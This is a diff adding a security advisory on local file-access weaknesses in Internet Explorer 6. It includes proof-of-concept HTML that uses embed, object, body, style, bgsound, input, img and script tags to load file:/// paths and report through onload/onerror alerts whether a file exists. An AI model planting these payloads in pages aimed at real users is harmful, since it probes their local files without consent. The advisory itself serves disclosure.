@@ -1,0 +1,57 @@
+source: http://www.securityfocus.com/bid/22621/info
+
+Microsoft Internet Explorer is reportedly prone to multiple local file-access weaknesses because the application fails to properly handle HTML tags.
+
+These issues are triggered when an attacker entices a victim user to visit a malicious website.
+
+Initial reports stated that remote attackers may exploit these issues to gain access to local system files via Internet Explorer. This would help attackers steal confidential information and launch further attacks. This attack would occur in the context of the user visiting the malicious site.
+
+New conflicting reports indicate that these issues result only in verifying the presence of files on a vulnerable system.
+
+These issues affect Internet Explorer 6 on a fully patched Windows XP SP2 system; previous versions and operating systems may also be vulnerable. 
+
+The following proof-of-concept HTML code is available:
+
+- Embed Tag Local file Access:
+
+<EMBED SRC="file:///C:/example.pdf" HEIGHT=600 WIDTH=1440></EMBED>
+
+- Object & Param Tag Local File Access:
+
+<object type="audio/x-mid" data="file:///C:/example.mid" width="200"
+height="20">
+<param name="src" value="file:///C:/example.mid">
+<param name="autoStart" value="true">
+<param name="autoStart" value="0">
+</object>
+
+- Body Tag Local File Access:
+
+<body background="file:///C:/example.gif" onload="alert('loading body
+bgrd success')" onerror="alert('loading body bgrd error')">
+
+- Style Tag Local File Access:
+
+<STYLE type="text/css">BODY{background:url("file:///C:/example.gif")}
+</STYLE>
+
+- Bgsound Tag Local File Access:
+
+<bgsound src="file:///C:/example.mid" id="soundeffect" loop=1 autostart=
+"true"/>
+
+- Input Tag Local File Access:
+
+<form>
+<input type="image" src="file:///C:/example.gif" onload="alert('loading
+input success')" onerror="alert('loading input error')">
+</form>
+
+- Image Tag Local File Access:
+
+<img src="file:///C:/example.jpg" onload="alert('loading image success')"
+onerror="alert('loading image error')">
+
+- Script Tag Local File Access:
+
+<script src="file:///C:/example.js"></script> 
